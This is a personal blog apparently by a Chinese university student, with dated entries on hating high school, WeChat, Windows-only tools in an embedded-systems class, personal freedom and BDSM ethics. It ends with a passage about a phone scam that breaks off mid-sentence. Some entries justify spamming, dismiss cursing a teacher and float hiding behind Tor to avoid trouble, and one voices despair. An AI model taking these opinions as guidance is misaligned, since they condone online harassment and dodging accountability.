My parents are doing nothing for my\nwellbeing.</p>\n<p>I was being bullyed too much by autonomy and dictation, by those\nsoftware companies. Being controlled feels horrifying to me. I did good\nenough not to drop out of school, but people don\u2019t understand that.</p>\n<p>I am not a very intelligent person, and I am being overwhelmed by\nschool work alone.

I am not going\nto somewhere that sucks great shit. If I want to shit, I go behind a\ntree, or I go to the toilet, but I am never going back to shitty high\nschool.</p>\n<p>High school is so shitty it is traumatizing to me to remember that\nexperience.</p>\n<p>There ain\u2019t no reason to remember high school. High school is\njail\u2013teachers are the dominant, students are the submissive. High school\nis where they rape you and force your consent and brainwashes you and\npunishes you. High school is where you get locked up 24/7.</p>\n<p>If I felt some nostalgia and wanted to go back somewhere it would\nprobably be SMIC school, because that was the place where at least I had\nfun and didn\u2019t hate. Other than that, I would suggest Shibei Middle\nSchool, although it is not an ideal place, but, more or less, not overly\nirritating.</p>\n<p>In high school you cram, not study. They force you to eat down the\nshits of the textbook for reasons to get good in the final exam. Only\nthis doesn\u2019t work for me anyways, so like, when I am forced to do\nsomething I don\u2019t want to do I don\u2019t do it.</p>\n<p>Also in high school you are sleep deprived. The teachers are autonomy\nand your daily schedule is very very tight.</p>\n<p>Honestly I ain\u2019t contributing to the autonomy or dictatership so\nthere I ain\u2019t going back to high school anyways. I don\u2019t like most of my\nhigh school former classmates now, and I try to maintain a reasonable\ndistance. I mean, we can still be friends, after acknowledging the\ndifference. Most of my high school classmates are submissive, and don\u2019t\ncare at all about being forced to shit 24/7, there ain\u2019t no helping that\nbro.</p>\n<p>High school made me freaking hate Chinese and Chemistry and Biology,\nprobably not again in my life would I get interested in those subjects\nagain, shit.</p>\n<p>If I would have a child I would hope for my child to get homeschooled\nor put somewhere without pressure, to be free and do whatever (they)\nwanted, like extensively gaming, staying up, being LGBT, whatever. It is\nnot on me to judge someone of something they do.</p>\n<h2 id=\"updates-2024.5.2\">Updates 2024.5.2</h2>\n<p>I don\u2019t want to study freakkkk.</p>\n<p>I mean, everybody does what they are good at, and I hate studying and\ngoing to school more than ever.</p>\n<p>I don\u2019t want to study anymore but the school requires people to study\nlol.</p>\n<p>If my child(suppose I have one) face the same problem I will kindly\nsay go do whatever you want long as you have decent income.</p>\n<p>Maybe being an artist, singer, writer, etc, all more interesting than\nfreaking school.</p>\n<p>I got obsessed with music videos these days:).</p>\n<p>Also running seemed to be coming back to me.

For example, some schools require their students to use\nWeChat. This is very problematic for my child.</p>\n<p>Let\u2019s picture this scenario. My child goes to school, and is required\nto use WeChat. Well, problem is, my child might not agree with WeChat\u2019s\nterms and conditions, so it goes against child\u2019s moral to use this\nsoftware, and child believes it to be malicious. The school, obviously,\ndidn\u2019t say that everyone must agree to WeChat\u2019s terms and conditions\nwhen they enter the school, and it is the school\u2019s fault that there\nmight be a person who goes into the school but disagrees with using\nWeChat. Obviously, nor is \u201ceveryone must use WeChat\u201d written in the\nlaws, so it\u2019s not illegal for someone to refuse. Consequentially, this\nwill be a really big problem. The fact that the terms and conditions\nexist is reasons not to consent to it.</p>\n<p>I am pretty much ok with web based communications like Discord,\nWhatsapp, but no to WeChat. I am agreeing to WeChat\u2019s terms right now\nbecause I am being coerced into agreeing by the school, or else it will\ncause me great discomfort. However, I don\u2019t want my child to face the\nsame discomfort in the future.</p>\n<p>Also, once I am not coerced into using WeChat, I will not consent to\nits terms and conditions(I don\u2019t even consent now lol), and I believe it\nis a malicious malware, and refuse to install it on my phone. But it is\nproblematic for my child in school, though. Usually there is a parents\ngroup where everyone\u2019s parent and the teacher get together to inform\nsome important events and stuff, and I refuse to use that app, so I\nwon\u2019t be able to receive notifications. (If given digital freedom I will\nprefer a PinePhone, but that\u2019s another story. Even on Android what if I\nrefuse to download a software?)</p>\n<p>Anyways, I am not disagreeing to too much stuff, so much that I can\u2019t\nlive. I am still ok with web based communications because that\u2019s only\nlike running some javascript in the browser. (I don\u2019t even care about\nnonfree Javascript!) I consent with using a computer, I consent with\nusing a phone, and I consent with pretty much any FOSS softwares! I am\nconsenting too much, not too little! If I don\u2019t consent and my child\ndoesn\u2019t consent to WeChat, and the school assumes everyone consent to\nit, then there is no option but to always get into trouble in\nschool!</p>\n<p>Another scenario is there is a computer class, and, say, the teacher\nrequires students to work in Windows with a proprietary software, like\nKeil uVision. Now, I am not saying this software is bad or something,\nbut forcing somebody to work in Windows is against their will. Say, my\nchild doesn\u2019t want to do that, and the child asks for alternative tools\nor open source platforms, or even proprietary blobs in Linux. But the\nteacher is so stupid and doesn\u2019t give him any instructions. Out of anger\nthe child storms out of the classroom, and refuse to take this\nclass.</p>\n<p>Well, the obvious consequence to such actions is the child failing\nthis course, and, as a consequence, not being able to advance into the\nnext grade because of \u201cIntellectual Disabilities\u201d.</p>\n<p>So if in such a scenario the child comes home and asks for my advice,\nI will say, the teacher is very much uneducated and technical\nimmature\u2013he deserver to be a delivery man more than he deserver to be a\nteacher(imagine a computer science teacher who doesn\u2019t know how to use\ncli and refuses to answer student\u2019s questions??). So obviously I will be\nbacking child up, and child will somehow convey this message to the\nschool classmates/teacher. As a consequence child will be isolated in\nschool, and get really bad grades. People will likely not understand,\nassuming child is \u201cInable in Computer Science\u201d or \u201cJust Showing Off or\nActing Strange\u201d when child is actually not, child is only refusing to\nwork with a proprietary software / Windows GUI and nothing else.</p>\n<p>The child might be proficient in coding in Linux environments, and\nknows more about computer than the teacher do(who might be a moron in\ncomputer science).</p>\n<p>An invalid argument is that in some cases, schools may be limited by\nbudget constraints. However, FOSS softwares doesn\u2019t require money or\nbudge to download! Their source code is free! Even the downloading\nbandwidth is free. There will only be budget constraints for the\nproprietary softwares! Also, there can be existing curriculums in\nschool, but the school should always allow(or provide adequate\ndocumentation) for those seeking an alternative way.</p>\n<p>Yet another scenario is the Chinese exams. The child fails in the\nChinese exams(in China they are really hard), and come home crying,\nsaying \u201cI\u201d have been criticized by the teacher. Well, what shall I do?\nIn such a scenario I believe that the child is doing enough to take that\nexam in the first place, and not having a word of complaint beforehand.\nBut those Chinese exams are boring as hell, and so is the Chinese class,\nand you cannot increase the scores by hard work, instead, they are\nusually predetermined and the teacher just don\u2019t like the answers of\nsome students(even if they have adequate reasons to backup), and gives\nthem low scores.</p>\n<p>Of course I don\u2019t care a damn about Chinese exams, but the school\nmight do, and the child might be in great trouble if child keeps failing\nin those exams, getting far behind the average score. As a result, child\nmight be left out among child\u2019s peer classmates, and be perceived as\n\u201cqueer\u201d.</p>\n<p>There are more scenarios to think about. Another scenario is the\nchild is LGBTQ+, and in some schools, girls can be objectified and\nperceived as partnering with a boy, contrarily, boys might be taught to\nmarry a girl in the future. Well, what they don\u2019t realize is that there\nis a mass group of homosexual people, and I believe they deserve their\nrights! If two girls like each other, or two boys like each other, then\nlet them be! Some teachers in teaching, might mistakenly try to create a\nclose bond between different sex that is usually problematic.</p>\n<p>Moreover, some child might refuse to be classified, e.g.\u00a0non-binary.\nOther might be not interested in sex at all, e.g., asexual. The school\nfails to represent those groups of minority.</p>\n<p>Thus modern schools have too many serious problems, and poses\nsignificant challenges if my child goes into it(given that I would have\na child in the first place). I would rather my child go pursue a career\nof athletes, like figure skating, gymnastics, distance running, etc, or,\nalternatively, try to be a ballet dancer, violinist, painter,\nphilosopher, pianist, etc, than going into the traditional school.</p>\n<p>Moreover, I don\u2019t feel I have enough time to homeschool my child for\naround 15 years. If my wife refuse too(say, I have a wife, and we\ndiscuss about such matter), choices are to not have a child at all than\nassuming the child will adapt to traditional school.</p>\n<h2 id=\"updates-2024.4.22\">Updates 2024.4.22</h2>\n<p>I am in that crappy embedded system again!!!

I am not\nusing a Linux phone right now, nor will I be doing that in the near\nfuture. The reasons:</p>\n<ol type=\"1\">\n<li>LineageOS Works Fine.

LineageOS is open source and\npretty customizable, it just lacks a traditonal cli like Linux.</p>\n<p>I am very sad indeed and looked at phones 10 years ago, which gave me\nlots of nostalgia. I remembered clearly those times where I used cash to\ndo stuff and they gave me much more control. I didn\u2019t have a smartphone\nuntil 2020 and I didn\u2019t use it extensively until late 2022. I couldn\u2019t\nbut feel a deep sense of remorse and just literally helplessness right\nnow.</p>\n<p>WeChat is more or less a malware stuff, and I hate it so much. I\nrefuse to go on 3rd party apps. I try to refuse as much as I can. I lost\nthis fight, there is nothing I can do about it, and that is the end of\nstuff.</p>\n<p>I started to listen to sad love songs, not for a girl in my mind, but\nfor nostalgic feeling.</p>\n<h2 id=\"updates-2024.4.16\">Updates 2024.4.16</h2>\n<p>The political teacher is very annoying, and the politics class is\nvery annoying.</p>\n<p>It is not annoying in the traditional way, like politics course in\nmiddle school where they try to stuck those ideas into your mind.\nInstead, the teacher is frequently touching sensitive topics, and\n\u201csuggesting stuff\u201d, it\u2019s very annoying.</p>\n<p>I don\u2019t dare to talk one thing bad about Winnie in China because\notherwise I would be jailed for life and tortured to death.

If you don\u2019t do\nanything chances are you won\u2019t be arrested in China.</p>\n<p>Anyways, especially those senseless talks in the group, and the\nteacher frequently touching those topics annoyed me. Someone said WeChat\nfacced sanctions, and suggested opening a Telegram Group for \u201cchatting\nin freedom\u201d, and wanted to talk about the tanks in Beijing. I almost\nbursted out \u201cif you want to open a gropu why not open a matrix or Libera\nChat instead of like Telegram\u201d, but controlled myself not to talk\nanything in the politics class group.</p>\n<p>Well, people are talking about politics when they rely on proprietary\nsoftware, lmao. They can\u2019t life the sanctions off their head and they\nare talking about politics? Hilarious! Imagine, losers.</p>\n<p>Anyways, politics is just annoying, everything about it is very\nbothering to me, and I really hate it or discussing it. I consider\nmyself more aligned with libertarianism(but not 100 percent libertarian,\nmore like non-party). I also consider myself a open source software\nadvocate(not Free software, though, I rely too much on some non-Free\nsoftwares, FSF is too incompatible with modern living standards).</p>\n<p>Computer science stuff simply appeal to me more than fu*king gaming\nor Winnie, and I can\u2019t care less about politics, lol.

I mean, like using Windows feels\nlike torture.</p>\n<p>I kind of wished I had selected any course other than this because\nthis is just a piece of shit everything here.</p>\n<p>If I hadn\u2019t attended Embedded system course in Berkeley, I would be\nvery annoyed at embedded systems. Although I didn\u2019t get a good grade\nback there, at least it made me very very interested in everything\nembeded related, including Linux phones and stuff and all of those,\nArduino, etc. But the hostility of this course and the systems and the\nsoftware, ahh, everything, made me wanna throw up.</p>\n<p>Alright, the kind kind teacher came and try to install it for me, but\nhe failed miserably, after messing around with Windows crappy shitty\nGUi\uff0ctrying to navigate his way through the messay GUI, couldn\u2019t figure\nit out as well, and try to generate a keys(a software needs keys to\nuse?shouldn\u2019t it be released open sourced?)</p>\n<p>Anyways, a student came by and stated he could do it in vscode for\nme, and he tried and bundled with it a bit, and it needs a exe path. Of\ncourse it is by no means available on my own computer, (the freaking\nkeil extension isn\u2019t available in the first place anyways in OSS Code),\nso like after that he said he needed to go and left without a fix for\nthe problem.</p>\n<p>So I was stuck with broken IDEs. I tried to ask for him to do it in\ncli but he said he hadn\u2019t known cli before, so I am greatly puzzled and\ndistressed. Then like he left without a clear message, and the windows\ndesktop shortcuts no longer opens lmfao.</p>\n<p>Well before I only heard windows is bad for setting up environment\nand many people recommend it in Debian based distros, but this is the\nfirst time someone tells me I could only do something in Windows, and\nrefuses to use cli. He said he doesn\u2019t know how, and I strongly question\nhis skills and ability. I said I use Linux, he was like \u201cwhat is Linux?\nI don\u2019t know Linux\u201d, which is almost like for a baby \u201cI don\u2019t know how\nto walk please tell me\u201d.</p>\n<p>Anyways after that the teacher came and reattempted to install the\nsoftware for me, only failing miserably again, and he was digging\nthrough the messy stupid gui. I went online to that website and\nattempted to download an exe(exes splash files all over the place it\nmesses up the whole computer), but I couldn\u2019t find anything valuable\nthrough the messy frontends.</p>\n<p>I kept saying I like cli and offered the stmcube IDE. However, the\nteacher said he didn\u2019t know and haven\u2019t used that tool lmfao. He didn\u2019t\nknow how to use cli either.</p>\n<p>Windows is just a bloated mess when it comes to softwares, and when\nit is actually installing stuff it gets really stinky, and it just DONT\nwork, period.</p>\n<p>The website has a http (very insecure, fraudulent suspected!), and\nthere is no way to access it. There are several 1000 pages info\npdfs(expect me to read wtf?).</p>\n<p>Anyways, the teacher went off to another group to check them off,\nthen he went back and continued attempting to install it for me. I\nmumbled thanks now and then, and the teacher said he would send me the\nkey to me in QQ. Ahh, I am so amazed by such a patient person! If it was\nme I would give up the installation process in half a minute!</p>\n<p>Then the teacher send the code to me in QQ! I am honestly after all\nthis crap I am no longer even angry lmao. And he made it work! After 1\nhour of hard work finished installing!</p>\n<h2 id=\"updates-2024.4.8\">Updates 2024.4.8</h2>\n<p>So something extremely annoying happened in the embeded system\nclass.</p>\n<p>Actually this class isn\u2019t even a major class, it\u2019s for general\npublic. I had already taken grad Embeded systems in Berkeley.</p>\n<p>In the class I had no idea what to do and I had no idea how to do it.\nI am just struck with loads of confusion and frustration, adding to this\npainful day.</p>\n<p>So what happened was that the teacher made us do some\n<code>experiments</code> with a board, and I had no idea what the fu*k\nto do. No one else had a problem! Only me! I am serious!</p>\n<p>The teacher asked students to download something called\n<code>keil \u00b5Vision</code>. It is start of a nightmare to work with this\nshitty thing. It doesn\u2019t even support Linux, and I was like what? Well\nit is my first time I actually had a problem with a software not\nsupported in Linux though.</p>\n<p>Anyways, I was like, well, this gotta be hard. Truth is, the software\nso called <code>keil \u00b5Vision</code> is both proprietary and has a very\nvery complicated ui that I have no idea what to do with it. There are\nwindows computers in the lab but using them is just very very painful,\nand agasint my morals. I would refuse and fight against the piece of\nrot.</p>\n<p>Well, what struck me is how much trouble I would encounter with so\ncalled \u201cgeneral education\u201d computer science course.</p>\n<p>I like to control things with cli, problem is, working in windows\nliterally made me disgusted.</p>\n<p>Virtual machines are also painful and bloat, especially running a\ncrapware like shitty Windows, which occupies hundreds of Gigabytes for\nno purpose at all. I mean, running a Linux VM is good enough, but\nwindows, well, that\u2019s another story altogether.</p>\n<p>I tried to ask the teacher, turns out teacher doesn\u2019t know, or isn\u2019t\nfamiliar with Linux.(Teacher isn\u2019t familiar with Google Lmao) It is like\nmy first time facing an actual incompatibility problem in Linux.\nAnyways, I quickly decided not to use the shitty vision IDE.</p>\n<p>Well I scanned the QR code on the back of the dev board, and it\nopened up a website with all resources in BaiduNetDisk. Turns out baidu\nis in my blacklisted websites, so lol.</p>\n<p>Also BaiduNetDisk requires downloading its rotten malware app to be\nable to download just anything to my device, and it completely\ndisrespects and bullies its users. Baidu is a company that\u2019s autonomous\nand tries every means to dominate its users, just like in those typical\nbd$m movies where man dominates and objectify a woman, except the user\ntakes the role of woman here.</p>\n<p>For a moment I got really thankful I went to Berkeley for a year. I\nnever thought like that before. In my year in Berkeley I was miserable,\nstruggling mentally and academically. Now looking back, I found the year\nvaluable in many ways, at least it is much more meaningful than wasting\ntime here in China. Honestly I never learned one thing about computer\nscience in USTC, I mean not one thing at all. All I learned here\npreviously (before I visited Berkeley) is computer science is a terrible\nthing, and I better stay away from it.</p>\n<p>Stallman expressed: \u201cAll things learned in Education shall be free\nsoftwares!\u201d Well you know what? Here is a class where I am required to\nuse nonfree softwares(and use Windows! I am scared).</p>\n<p>I started to really missing the <code>Lingua Franca</code> program I\nused in Berkeley for Pololu. I started missing my Raspberry Pi. I got no\nidea why people would design shit like this for me. I know I had done\nmany evils, like eating animals or whatever, but why do I have to bear\nwith shit softwares? I am better off dead.</p>\n<p>Then I finally downloaded the example code after like unzipping a\nmillion layers. Even the folder is a complete mess\u2013they zip it multiple\nlayers, you know? I was like What the Freak? They zipped it and included\nthose generated files, and included a million projects with generated\nfiles for each in one folder, and it isn\u2019t even available anywhere in\nGitHub or something. Honestly it look every bit like piece of malware or\nsoftwares like primary school students would be digusted to write.</p>\n<p>The files are mostly generated by the crappy \u201ckeil vision\u201d software.\nIt is like, well, imagine uploading all the node modules everywhere you\ngo, or a HuggingFace Model with Pytorch environment packed with every\npython script. And it is not a personal project, which can be forgiven\nfor ignorance or lack of time to organize. Come on, it\u2019s a commercial\nproduct.</p>\n<p>There is also a website <code>https://prechin.net/</code> written on\nthe back of it. Turns out this website is dangerous and I need to click\nthrough the dangers to proceed. It\u2019s no difference than a scam website\nthat says your computer is infected with virus and asks for bitcoins.\nThe frontend looks like a piece of crap to me. Why don\u2019t they just run a\ndiscourse if they don\u2019t want to manually code everything?</p>\n<p>Any software that works exclusively on Windows is pure garbage. I am\nliberal enough and I am not against proprietary softwares, but being\nboth proprietary and working solely on a os that dominates its users,\nman!</p>\n<p>There are certain softwares that work only on Windows, turns out they\ncan\u2019t work.</p>\n<p>Well, what can I say about them? They have every last bit of bad\npractices in everything, code, website. Ahh, I would trust a homeless\nperson more than the shitty company, and the shitty class.</p>\n<p>Those people even included \u201copen source\u201d in their website title. So\nShameless!</p>\n<p>Anyways, after finally extracting the files I try to write a makefile\nto make it work. But it kept failing, constantly complaining about the\nfile (a library). Obviously the teacher doesn\u2019t know how to debug. He\ndoesn\u2019t know how to use Linux lmao.</p>\n<p>So that was the end of class, and I got kind of scared.</p>\n<h2 id=\"updates-april\">Updates April</h2>\n<h3 id=\"thinking-about-6dm\">Thinking about 6d$m</h3>\n<p><strong>Tags</strong>: <code>morality</code></p>\n<p>Lately I have been thinking about 6d$m. I am intersted in comparing\nmaledom and femdom.</p>\n<p>I find watching CBT or scat fetish deeply disgusting and disturbing.\nI couldn\u2019t think why a sane man would want to be submissive like that?\nIt seems very painful and dirty.</p>\n<p>Then I thought about like the female\u2019s perspective on male\ndomination, and I wonder if they think the same way. Most adult videos\nare targeted towards females, and for male satisfaction. So I wonder if\nfemale would find the male domination disturbing and disgusting like I\ndo for femdom. These womans are treated really harshly, that\u2019s all I can\nsay.</p>\n<p>And actually I think male dominations is objectification of females.\nI don\u2019t care that much about legality, but just starting from a morality\npoint of view, male domination always reminds me of the patriarchy\nsociety. It\u2019s kind of dehumanizing to females who are powerless. Males\nare born to be stronger on average than females, and the domination and\nsubmissive can\u2019t help but remind me of something very nasty.</p>\n<p>I mean, at least like morally I find gaydom or lezdom or femdom to be\nacceptable. But maledom, though previously I didn\u2019t find it disturbing\nor bad, seems to me like a problem more and more. Is it morally correct\nto do so? If\n6d$$m is an objectification of woman, then how do the dom follow the consent, since objects doesn't give consent? Isn't the woman more forced and coerced at some point, or always sacrifying herself to satisfy the male desire in 6d$$m?\nRemember, consent doesn\u2019t always justify one\u2019s doings. Somebody can give\na consent when he or she is starving, or drunk, or unable to pay the\nrent, but that obviously doesn\u2019t justify like your doings.</p>\n<p>There is a certain difference between maledom and femdom. Femdom is\nnot as inherently morally questionable as maledom, since male are\nusually the stronger person. Femdom is not that harmful, since sexual\nharrasement happens more than 99% to woman. Homosexual 6d$m is also not\ninherently wrong, since it is more like focusing solely on roleplaying,\nand tend to be more equal in terms of power.</p>\n<p>While I don\u2019t oppose consensual sex between partners or adults\nengaging in activities like couple\u2019s intimacy, threesomes, or portraying\nhomosexual relations in videos, I find the depiction of\n6d$$m to be more controversial. 6d$$m frequently shows women in bondage\nand submissive, begging positions. This can stimulate predatory and\nviolent tendencies in male viewers by reinforcing the image of women as\nsubordinate objects for male dominance and consumption. With the\nwidespread prevalence of such content, the portrayal of bounded, serving\nwomen as fodder for male sexual appetites becomes a concerning norm.</p>\n<p>Is there some female who would be willing to work for 6d$m in adult\nindustry? Yes, of course. If the industry brings enough money, certain\nwoman are willing to sacrifice their health or dignity, even if they\nalready have foods and shelter. There are lots of these woman out there,\nactually willing to perform and be portrayed in those adult films as\nsubs.</p>\n<p>But does an individual\u2019s consent inherently justify the portrayal of\n6d$m? No, I don\u2019t believe it does. There are certainly people willing to\nengage in various unethical or harmful acts purely for amusement\u2019s sake,\nsuch as recreational drug use or participating in gore videos for money.\nA fully consented 17 year old couple cannot post their sex videos\nonline. And without legal protections, there would undoubtedly be many\nunderage individuals coerced into sex work despite their perceived\n\u201cconsent.\u201d The existence of consent alone, even without financial\ndesperation as a factor, does not automatically provide moral\njustification for an action.</p>\n<p>Honestly I don\u2019t care what couples do in their bedrooms. They do\nwhatever they want. Child porn is not allowed but underage people are\nallowed to have sex. Couples are even do gore in their bedrooms, totally\nfine. The problem lies in the normal social perception of 6d$m, and I\nbelieve it should have a far stricter and cautious approach.</p>\n<p>Consent alone does not necessarily make something ethical if it\nnormalizes or perpetuates societal attitudes and power dynamics that can\nbe dehumanizing or harmful. Imagine depicting and promoting femdom\ninvolving CBT or scat fetish, which, I think is dehumanzing the male, I\nwould be utterly disgusted by the image. But for the counterpart, isn\u2019t\ndoing the same thing to female disgusting and unacceptable?</p>\n<p>As for myself, I find it some 6d$m morally questionable, but that\nremains to be debated, as these questions doesn\u2019t have a clear\ndefinitive answer yet.</p>\n<h3 id=\"thinking-about-freedom\">Thinking about Freedom</h3>\n<p><strong>Tags</strong>: <code>freedom</code></p>\n<p>Today I was thinking about what I wanted to do in my life in the\nfuture, and I thought about like PhD degree and being a professor or\nwhatever, but more like, I don\u2019t have any potentials to think about my\nfuture life right now.</p>\n<p>I am not free. I am constantly controlled and manipulated by my\nparents, and I am in the giant pool of anxiety and depression and\ninconfidence. I was in that condition as long as I left middle school,\nnot that middle school is good or whatever. I clearly remembered happy\nfor a bright future when I was walking around in Green City after 9th\ngrade. But everything was but my hope(not things are bad or whatever,\nthey are just, unreasonable). Ever since I entered high school, I felt\ninto the swarm of depression and anxiety, and I couldn\u2019t get out.</p>\n<p>I think that I must first strive for 4 freedoms before thinking about\na clear goal in my life(because all I can think about is these 4\nfreedoms right now).</p>\n<p>The first freedom is freedom of time. This literally means I must\nhave a substantial amount of time for myself. This doesn\u2019t mean I won\u2019t\nbe studying for that long, instead, it means I get the freedom to decide\nwhether I want to study or not for a substantial amount of time. I get\nto decide whether to study or play or sleep or stay up all night, given\nthat I don\u2019t distract others. That is not ideal for now, but quite\nclose.</p>\n<p>The second freedomm is freedom of choice. I get to decide things, and\nI get to keep my preferences. If I prefer sommething, people don\u2019t\n\u201cfriendly advise\u201d me to do otherwise. This friendly advise is usually\nstrong coersion. If I don\u2019t like something, fine, long as it doesn\u2019t\naffect others, I get to keep it as I want. If I have a strange hobby\nthat many people find unreasonable, fine! Actually I don\u2019t care about\nthe choice for foods or room that much, but I don\u2019t care doesn\u2019t mean I\ndon\u2019t have the right to care. If I want to watch porn, fine!(not that I\nwant to watch porn) If I want to play video games for 24 hours straight\nand given I can care for my health, fine! If I dislike living in a dorm,\nand I don\u2019t distract others when living alone, then I don\u2019t live in a\ndorm, and no questions asked. I have the freedom to choose! This is not\nideal for now, primarily because my parents keeps \u201cfriendly coercing\u201d me\nto do contradictory things all the time, constantly mocking and\nthreatening even, making me very tense. I don\u2019t dislike my parents, they\nare good guys. But they need to stop impacting my choices, and they are\nbecoming annoying now at this.</p>\n<p>The third freedom is digital freedom. This includes using open-source\nsoftwares. I don\u2019t support Richard Stallman\u2019s views 100%, especially his\nfree softwares. I find open-source softwares good enough, and I think\nmore importantly I need to have control over the software. WeChat, in\nparticular, is a malware, and crawls slowly into the user\u2019s mind and\ndominates the user. It is not only a malware in the phone, but also a\nmalware in the user\u2019s brain. WeChat makes users depend on it, depriving\nthem of control, and constantly brainwashes its users, just like many\nother Chinese platforms. When I start using WeChat I would spend a far\nsubstantial time online doing all sorts of completely meaningless\nactivities. The easiest way to achieve digital freedom is to use\nPostMarketOS for smartphone, and lock LineageOS Redmi Phone is a box,\nand only open it seldomly for doing necessary stuff. This is not ideal,\nbut pretty close too.</p>\n<p>The fourth freedom is self-sufficiency. I need to support myself\nwithout depending on my parent\u2019s money. This is important because if I\ndepend on them, then I need to listen to their advices. They have the\npower over me. The problem is my parents are getting increasingly\nmisleading, and gives contrary and wrong ideas in many aspects of my\nlife, and they want to control my life in their hands. Well, if I go\nself sufficient I will have a much stronger voice when not listening. I\nam already an adult, if I commit a crime I need to take full\nrespoonsibility of it, so why shouldn\u2019t I take full responsibility of\nother aspects of my life? Also, if I don\u2019t want to live in a dorm and my\nparents does, and I go self-sufficient, then I can go live in wherever I\ncan afford, and I can give no specific reasons for my behaviors. This is\nfar from being satisfied since I have no income now. I need to have a\nstable income, and constantly support myself, not that my family is\npoor, but just to illlustrate that I can.</p>\n<p>So I hope for these to be true in the PostGrad period. If I got\nththoseose things satisfied, then I can try thinking about my life\u2019s\ngoals or aims. Without these, all that\u2019s in my head is the enormous\nendless depression and anxiety when I think about such things.</p>\n<h2 id=\"updates-march\">Updates March</h2>\n<h3 id=\"freedom-the-the-starting-point-in-lifes-meanings\">Freedom \u2013 the\nthe Starting Point in Life\u2019s Meanings</h3>\n<p>There are many times when I started thinking about what to do, and it\nultimately boils down to what is life\u2019s true purposes. And it took me\nmany days trying to figure it out, and I am still failing.</p>\n<p>But the starting point is freedom, in self-control. Freedom in 3\nways- physical and digital freedom, time freedom, and freedom of\nchoice.</p>\n<p>Without freedom there is no talking about whatever meanings of life\nis. I am not willing to sacrifice freedom for any achievements(partially\nlike a few weeks, yes, in long terms, no).</p>\n<p>Many ambitious goals <strong>ROB</strong> me of freedom, and that\u2019s\nwhat got me undetermined.</p>\n<p>Without freedom and self-sufficiency, I do believe that life is\nwithout its meanings, and I would rather prefer doing nothing than\nachieving anything.</p>\n<h3 id=\"reflecting-on-the-previous-troubles-i-got-into\">Reflecting on\nthe Previous Troubles I got into</h3>\n<p>I got into encounters of trouble on the Internet during the ages of\n16-17.</p>\n<ol type=\"1\">\n<li>Spamming messages on a military education website</li>\n<li>Cursing the teacher(in so-called anonymous platforms)</li>\n<li>Being alleged of cheating in competitive programming(helping out a\nteammate who constantly complains about not being able to read English\nto translate in Microsoft word, which is alleged \u201ccheating\u201d since\nInternet access isn\u2019t allowed, but the competition is online, which is\ncomplicated, and the person was only using Microsoft word)</li>\n</ol>\n<p>Well, the three situations share a common trait, which is it\u2019s on a\nproprietary platform and I was using shitty Microsoft. In short, by\nanonymizing myself on the Internet(obviously not believing in those\nso-called anonymous features after logging it????), probably using tor\nor several vpns or whatever, and switching to libretranslate if\npossible?(although I myself didn\u2019t have any problems with English but I\n\u201cguided\u201d a teammate to use shiity Microsoft Word for translating to\nChinese, and the situation exploded and the whole school was banned\nbecause of this \u201ccheating\u201d, although I didn\u2019t know about it in its\nrules)</p>\n<p>That said, it definitely shouldn\u2019t be <strong>me</strong> to offer\nhelp on proprietary platforms like shitty Windows. I mean I can work\nliterally seamless in probably all Linux distros and Rasp Pi, other\nother systems and cloud hosting and cloud gpus, and maybe half of\nAndroid and LineageOS platform problems, but proprietary platforms like\nshitty Windows is just not my taste. There are lots of powershell\nexperts out there, who probably don\u2019t know what Linux is but are awfully\nproficient working on those proprietary platforms. Ask them for help. I\nwon\u2019t provide anymore help on Windows, nor do I know how to use it aside\nfrom like browsing web? I can do nothing but mess up this crappy\nsystem.</p>\n<p>That said, although my purpose of using Linux is KISS, being simple\nsmall secure whatever, Linux is certainly good for designing and\nsuitable for someone who prefers heavy art. Just save the dot files or\ntry to customize KDE Plasma for a MAC experience, or whatever. Doing\nthose beauty is not my cup of tea, I prefer a simple intuitive desktop,\nperiod.</p>\n<p>I was a little paranoid after the situations, and started deleting\nsocial media accounts after that. As of now I pretty much deleted all my\nsocial media accounts except for necessary ones like WeChat and QQ. I\nusually have some extremist thoughts that could be categorized as\ninappropriate, other times I just natually wanted to do some\nexperiments, like spamming messages, whatever. I can do whatever I want\nin like, a self-hosted platform like discourse or mastodon say whatever\nI want. I deleted like Instagram and Vkontakte accounts one year later.\nAfter all, I just want to be invisible for the proprietary\nplatforms.</p>\n<p>Also, another problem is that even if many people are saying\ninappropriate things, I shouldn\u2019t follow them because I might be more\nextreme.</p>\n<p>Back to the topic of judging whether these are moral. Firstly,\nspamming, I think, is moral if not explicitly against a platform\u2019s term\nof service. However, it\u2019s best to avoid those troubles, especially in\nChinese platforms, since you need to do more than moral in this world.\nIt is not my morals that stop me from doing many things, but instead, a\nway to avoid troubles. Secondly, I think cursing is not moral at all,\ngiven that cursing have no real effects and it\u2019s just, well bad.\nHowever, what the teacher did to my grades was clearly unfair, and, as a\nchild at that time I couldn\u2019t do anything. Is that moral? I don\u2019t know,\nI mean, it is justifiable from the teacher\u2019s perspective, but it was\nstill too much for me mentally to bear at that time. That said, I will\nprobably go crazy if I go into some conscription or military camps or\neven in high school, I mean it, and there wasn\u2019t any helping at that\ntime. So given my lack of mind and control, I think cursing people isn\u2019t\nsuch a big deal from my perspective, just don\u2019t do it on those school\nplatforms, because if the school decides to take serious actions like\nexpelling me it\u2019s just not worth it.</p>\n<p>Thirdly, I do think my action is 100 percent moral and within the\nrules, and it is just that this competition is too crappy, and there\nwere no rules being told beforehand, and I didn\u2019t go online\nintentionally. So it\u2019s best to avoid those stupid competitions after all\nif they are practically unoffical and useless. That said, there wasn\u2019t\nany helping to do for this thing, and I was lucky USTC didn\u2019t expell me,\nonly letting me write a whole paper for the situation. I kept realizing\nthat even if going to university is like a shitpile then USTC is\nprobably the cleanest and most liberal ones among them.</p>\n<h3 id=\"reflecting-on-the-telephone-fraud\">Reflecting on the Telephone\nFraud</h3>\n<p>I remembered the telephone fraud that happened about 8 months ago. I\nam summarizing and reflecting on it.</p>\n<ol type=\"1\">\n<li>A person calls me claiming to be Chinese embassy person. He says I\nwas involved in a fraud crime, and hope I could go there for a visit to\nclarify(I am annoyed), and I was going to class, and he asked to call me\nback a few minutes later</li>\n<li>He called me back, and claming something more serious, and claming I\nwould be sent back to China. He asked to try letting a \u201cpoliceman\u201d talk\non the phone for this matter.</li>\n<li>A \u201cpoliceman\u201d got on the phone, claiming he is \u201cofficial\u201d by\nchanging some digits of the telephone number. (I believed and thought it\nwas a little bit of trouble). Then he started talking to me for long\nhours about what I did and what consequences I would face(I actually\nnearly believed)</li>\n<li>He kept talking to me the same words again and again, and I got\nsuper scared. He then asked to use Skype, and asked for my bank\ncredentials and id card number and passport number, which I told him.\nEssentially the scare is what got me. He had total control over me when\nI am scared. So, getting scared makes me 